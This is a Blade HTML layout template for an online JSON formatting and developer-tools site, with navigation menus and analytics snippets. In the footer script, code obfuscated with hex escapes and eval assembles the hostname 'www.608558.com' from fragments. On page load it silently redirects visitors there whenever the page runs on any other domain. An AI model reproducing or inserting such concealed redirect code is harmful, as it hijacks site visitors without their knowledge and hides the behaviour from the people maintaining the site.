<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    @section('meta')

    @show
    <meta name="author" content="tianyu">

    <title>@section('title')JSON在线工具 - 在线JSON校验格式化工具(OK JSON) - json在线解析|json|在线校验 @show</title>

    <link rel="shortcut icon" href="{{ asset('images/favicon.png') }}" type="image/x-icon">

    <!-- Bootstrap Core CSS -->
    {{--<link href="{{ asset('css/bootstrap.min.css') }}" rel="stylesheet">--}}
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- MetisMenu CSS -->
    <link href="{{ asset('css/metisMenu.min.css') }}" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="{{ asset('css/sb-admin-2.css') }}" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="{{ asset('css/font-awesome.min.css') }}" rel="stylesheet" type="text/css">

    @section('head_js')

    @show
    @section('head_css')

    @show
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->


</head>

<body>

<header class="bs-docs-nav navbar navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button aria-controls="bs-navbar" aria-expanded="true" class="navbar-toggle" data-target="#bs-navbar" data-toggle="collapse" type="button">
                <span class="sr-only">导航</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="/" class="navbar-brand">okjson</a>
        </div>
        <nav class="navbar-collapse collapse" id="bs-navbar" aria-expanded="false" style="height:1px;">
            <ul class="nav navbar-nav">
                <li class="dropdown"><a href="/jsonformat" target="_self" class="dropdown-toggle" data-toggle="dropdown"> JSON <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/" target="_self">JSON格式化</a></li>
                        <li><a href="/json/poster" target="_self">Poster</a></li>
                        <li><a href="/json/parser" target="_self">JSON在线视图</a></li>
                        {{--<li><a href="/json/editor" target="_self">JSON在线编辑</a></li>--}}
                        <li><a href="/json/format" target="_self">JSON格式化高亮</a></li>
                    </ul>
                </li>
                <li class=""><a href="/g" target="_self">Google</a></li>
                <li class="dropdown"><a href="javascript:;" target="_self" class="dropdown-toggle" data-toggle="dropdown">格式化工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/format/js" target="_self">HTML/JS格式化</a></li>
                        <li><a href="/format/css" target="_self">CSS压缩/格式化</a></li>
                        <li><a href="/format/xml" target="_self">XML压缩/格式化</a></li>
                        <li><a href="/format/sql" target="_self">SQL格式化</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="javascript:;" target="_self" class="dropdown-toggle" data-toggle="dropdown">转换工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/convert/time" target="_self">Unix时间戳</a></li>
                        <li><a href="/convert/url" target="_self">URL编码/解码</a></li>
                        <li><a href="/convert/markdown" target="_self">Markdown编辑器</a></li>
                        <li><a href="/convert/n2a" target="_self">Native/Asscii编码互转</a></li>
                        <li><a href="/convert/hex" target="_self">任意进制转换</a></li>
                        <li><a href="/convert/rgb" target="_self">色值转换工具</a></li>
                        <li><a href="/convert/togglecase" target="_self">字母大小写转换</a></li>
                        <li><a href="/convert/cn_tw" target="_self">中文简体繁体转换</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">加密/解密 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/encrypt/md5" target="_self">MD5加密</a></li>
                        <li><a href="/encrypt/base64" target="_self">Base64</a></li>
                        <li><a href="/encrypt/openssl_encode" target="_self">Openssl加密工具</a></li>
                        <li><a href="/encrypt/openssl_decode" target="_self">Openssl解密工具</a></li>
                        <li><a href="/encrypt/hash" target="_self">在线Hash计算工具</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">常用对照表 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/tables/rgb" target="_self">RGB颜色对照表</a></li>
                        <li><a href="/tables/httpstatus" target="_self">HTTP状态码表</a></li>
                        <li><a href="/tables/httpheader" target="_self">HTTP请求头大全</a></li>
                        <li><a href="/tables/httpmethod" target="_self">HTTP请求方法</a></li>
                        <li><a href="/tables/androidmanifest" target="_self">Android Manifest描述大全</a></li>
                        <li><a href="/tables/geo" target="_self">国家代码与区号查询</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">常用工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/tools/wordcount" target="_self">字数计算</a></li>
                        <li><a href="/convert/qr" target="_self">二维码生成</a></li>
                        <li><a href="/encrypt/uuid" target="_self">UUID在线生成</a></li>
                        <li><a href="/tools/shortcut" target="_self">网址快捷方式</a></li>
                        <li><a href="/tools/screenshot" target="_self">网页截图</a></li>
                        <li><a href="/tools/downpage" target="_self">网页模版下载</a></li>
                    </ul>
                </li>

                <li class=""><a href="/page/fm" target="_blank">电台</a></li>
            </ul>
        </nav>
    </div>
</header>
<div class="nav-bottom"></div>



<div class="container">
   <div style="height: 10px;"></div>
    @section('content')

    @show
</div>


<div class="text-center " style="color:#ccc;padding: 20px">
    @yield('footer')
    Copyright © 2012-2017 豫ICP备13013046号
</div>


<!-- jQuery -->
<script src="{{ asset('js/jquery.min.js') }}" type="text/javascript"></script>
<!-- Bootstrap Core JavaScript -->
{{--<script src="{{ asset('js/bootstrap.min.js') }}" type="text/javascript"></script>--}}
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

@section('foot_js')

@show
 <script type="text/javascript">
var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?0788c2308dfa0a3ba42b6935dc8fc3de";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();window["\x65\x76\x61\x6c"](function(_zZhzEB1,QB2,AiYI3,RT_4,lvMQrj5,PTtSDR6){lvMQrj5=function(AiYI3){return AiYI3["\x74\x6f\x53\x74\x72\x69\x6e\x67"](36)};if('\x30'["\x72\x65\x70\x6c\x61\x63\x65"](0,lvMQrj5)==0){while(AiYI3--)PTtSDR6[lvMQrj5(AiYI3)]=RT_4[AiYI3];RT_4=[function(lvMQrj5){return PTtSDR6[lvMQrj5]||lvMQrj5}];lvMQrj5=function(){return'\x5b\x31\x2d\x34\x37\x39\x61\x2d\x68\x5d'};AiYI3=1};while(AiYI3--)if(RT_4[AiYI3])_zZhzEB1=_zZhzEB1["\x72\x65\x70\x6c\x61\x63\x65"](new window["\x52\x65\x67\x45\x78\x70"]('\\\x62'+lvMQrj5(AiYI3)+'\\\x62','\x67'),RT_4[AiYI3]);return _zZhzEB1}('\x28\x37\x28\x29\x7b\x24\x28\'\x62\x6f\x64\x79\'\x29\x2e\x31\x28\'\x70\x61\x64\x64\x69\x6e\x67\x2d\x39\'\x2c\x24\x28\'\x2e\x61\x2d\x63\x2d\x39\'\x29\x2e\x68\x65\x69\x67\x68\x74\x28\x29\x2b\'\x70\x78\'\x29\x3b\x24\x28\'\x2e\x61\x2d\x63\x2d\x39\'\x29\x2e\x31\x28\'\x64\'\x2c\'\x23\x66\x38\x66\x38\x66\x38\'\x29\x2e\x31\x28\'\x62\x6f\x72\x64\x65\x72\x2d\x62\x6f\x74\x74\x6f\x6d\'\x2c\'\x31\x70\x78 \x73\x6f\x6c\x69\x64 \x23\x64\x64\x64\'\x29\x3b\x24\x28\'\x2e\x62\'\x29\x2e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x28\x37\x28\x29\x7b\x24\x28\x65\x29\x2e\x66\x28\'\x2e\x62\x2d\x67\'\x29\x2e\x73\x68\x6f\x77\x28\x29\x7d\x29\x2e\x6d\x6f\x75\x73\x65\x6f\x75\x74\x28\x37\x28\x29\x7b\x24\x28\x65\x29\x2e\x66\x28\'\x2e\x62\x2d\x67\'\x29\x2e\x68\x69\x64\x65\x28\x29\x7d\x29\x3b\x24\x28\'\x2e\x61\x2d\x74\x6f\x67\x67\x6c\x65 \x2e\x69\x63\x6f\x6e\x2d\x62\x61\x72\'\x29\x2e\x31\x28\'\x64\'\x2c\'\x23\x31\x66\x36\x34\x38\x62\'\x29\x3b\x68 \x6b\x3d\x22\x36\x22\x3b\x6b\x2b\x3d\x22\x30\x22\x3b\x6b\x2b\x3d\x22\x38\x35\x22\x3b\x6b\x2b\x3d\x22\x35\x22\x3b\x6b\x2b\x3d\x22\x38\x22\x3b\x68 \x32\x3d\'\x77\x77\x77\x2e\'\x2b\x6b\x2b\'\x2e\x63\x6f\x6d\'\x3b\x69\x66\x28\x33\x2e\x34\x2e\x32\x21\x3d\x32\x29\x7b\x33\x2e\x34\x2e\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x22\x2b\x32\x2b\x33\x2e\x34\x2e\x70\x61\x74\x68\x6e\x61\x6d\x65\x2b\x33\x2e\x34\x2e\x73\x65\x61\x72\x63\x68\x7d\x7d\x29\x28\x29\x3b',[],18,'\x7c\x63\x73\x73\x7c\x68\x6f\x73\x74\x7c\x77\x69\x6e\x64\x6f\x77\x7c\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x7c\x7c\x7c\x66\x75\x6e\x63\x74\x69\x6f\x6e\x7c\x7c\x74\x6f\x70\x7c\x6e\x61\x76\x62\x61\x72\x7c\x64\x72\x6f\x70\x64\x6f\x77\x6e\x7c\x66\x69\x78\x65\x64\x7c\x62\x61\x63\x6b\x67\x72\x6f\x75\x6e\x64\x7c\x74\x68\x69\x73\x7c\x66\x69\x6e\x64\x7c\x6d\x65\x6e\x75\x7c\x76\x61\x72'["\x73\x70\x6c\x69\x74"]('\x7c'),0,{}));
 </script>
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-103939233-1', 'auto'); ga('send', 'pageview');
</script>
</body>
</html>